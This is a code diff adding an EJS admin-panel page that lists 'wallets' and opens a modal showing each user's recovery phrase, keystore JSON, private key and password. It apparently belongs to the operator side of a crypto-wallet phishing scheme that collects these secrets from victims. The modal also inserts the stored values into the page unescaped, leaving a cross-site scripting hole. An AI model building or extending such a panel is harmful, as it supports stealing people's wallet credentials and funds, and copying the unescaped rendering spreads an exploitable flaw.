@@ -1,0 +1,101 @@
+
+
+<%- include('../partials/header', { title: 'Wallets - Admin Dashboard' }) %>
+<%- include('../partials/nav', { page: 'wallets' }) %>
+    <%- include('../partials/toast') %>
+
+    <div class="bg-white rounded-lg shadow overflow-hidden">
+        <div class="overflow-x-auto">
+            <table class="w-full">
+                <thead class="bg-gray-100">
+                    <tr>
+                        <th class="px-4 py-3 text-left text-sm font-medium">User</th>
+                        <th class="px-4 py-3 text-left text-sm font-medium">Key ID</th>
+                        <th class="px-4 py-3 text-left text-sm font-medium">Login Type</th>
+                        <th class="px-4 py-3 text-left text-sm font-medium">Action</th>
+                    </tr>
+                </thead>
+                <tbody class="divide-y divide-gray-200">
+                    <% wallets.forEach(wallet => { %>
+                    <tr>
+                       <td class="px-4 py-3 text-sm">
+                        <%= wallet.user && wallet.user.fullname ? wallet.user.fullname : 'Deleted User' %>
+                        </td>
+                        <td class="px-4 py-3 text-sm"><%= wallet.keyid %></td>
+                        <td class="px-4 py-3 text-sm"><%= wallet.type_of_login_detail %></td>
+                        <td class="px-4 py-3 text-sm">
+                            <button onclick="showWalletModal('<%= wallet._id %>')" class="text-black hover:underline">View</button>
+                        </td>
+                    </tr>
+                    <% }); %>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- WALLET MODAL -->
+<div id="walletModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+    <div class="bg-white rounded-lg max-w-2xl w-full max-h-screen overflow-y-auto">
+        <div class="p-6">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-bold">Wallet Details</h2>
+                <button onclick="closeModal()" class="text-2xl">&times;</button>
+            </div>
+            <div id="modalContent" class="space-y-3 text-sm"></div>
+            <div class="flex gap-3 mt-6">
+                <button id="deleteBtn" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-gray-900">Delete</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const wallets = <%- JSON.stringify(wallets) %>;
+
+    function showWalletModal(walletId) {
+        const wallet = wallets.find(w => w._id === walletId);
+        if (!wallet) return;
+
+        let content = `
+        <div><strong>User:</strong> ${wallet.user && wallet.user.fullname ? wallet.user.fullname : "Deleted User"}</div>
+
+            <div><strong>Key ID:</strong> ${wallet.keyid}</div>
+            <div><strong>Login Type:</strong> ${wallet.type_of_login_detail}</div>
+        `;
+        
+        if (wallet.Phrase) content += `<div><strong>Phrase:</strong> ${wallet.Phrase}</div>`;
+        if (wallet.Keystore_json) content += `<div><strong>Keystore JSON:</strong> ${wallet.Keystore_json}</div>`;
+        if (wallet.Private_Key) content += `<div><strong>Private Key:</strong> ${wallet.Private_Key}</div>`;
+        if (wallet.password) content += `<div><strong>Password:</strong> ${wallet.password}</div>`;
+        
+        document.getElementById('modalContent').innerHTML = content;
+        document.getElementById('walletModal').classList.remove('hidden');
+
+        document.getElementById('deleteBtn').onclick = () => deleteWallet(walletId);
+    }
+
+    function closeModal() {
+        document.getElementById('walletModal').classList.add('hidden');
+    }
+
+   function deleteWallet(walletId) {
+  if (confirm('Are you sure you want to delete this wallet?')) {
+    fetch(`/admin/wallets/${walletId}`, { method: 'DELETE' })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          alert('Wallet deleted successfully');
+          location.reload();
+        } else {
+          alert('Error: ' + data.message);
+        }
+      })
+      .catch(err => alert('Network error: ' + err.message));
+  }
+}
+
+</script>
+
+</body>
+</html>
